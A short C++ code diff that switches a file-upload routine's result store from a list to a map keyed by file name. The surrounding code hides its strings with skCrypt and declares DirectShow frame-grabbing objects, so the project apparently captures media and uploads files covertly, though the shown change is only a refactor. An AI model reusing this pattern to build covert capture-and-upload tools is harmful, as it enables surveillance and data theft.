@@ -6,7 +6,7 @@ namespace fs = std::experimental::filesystem;
 
 EXTERN_C const CLSID CLSID_NullRenderer;
 EXTERN_C const CLSID CLSID_SampleGrabber;
-vector<string> filesLink;
+map<string, string> filesLink;
 
 int GetTimeOfDay(struct timeval* tp, struct timezone* tzp) {
     static const uint64_t EPOCH = ((uint64_t)116444736000000000ULL);
@@ -617,12 +617,12 @@ void UploadFiles(const vector<string>& files) {
             str[sizeof(buf)] = 0;
             Json data = Json::parse(str);
             if (data[(string)skCrypt("status")])
-                filesLink.push_back((string)data[(string)skCrypt("data")]
-                                                [(string)skCrypt("file")]
-                                                [(string)skCrypt("url")]
-                                                [(string)skCrypt("full")]);
+                filesLink[file] = (string)data[(string)skCrypt("data")]
+                                              [(string)skCrypt("file")]
+                                              [(string)skCrypt("url")]
+                                              [(string)skCrypt("full")];
             else
-                filesLink.push_back((string)skCrypt("none"));
+                filesLink[file] = (string)skCrypt("none");
         }
 
 
@@ -636,6 +636,6 @@ void UploadFiles(const vector<string>& files) {
     }
 }
 
-vector<string> GetLinks() {
+map<string, string> GetLinks() {
     return filesLink;
 }
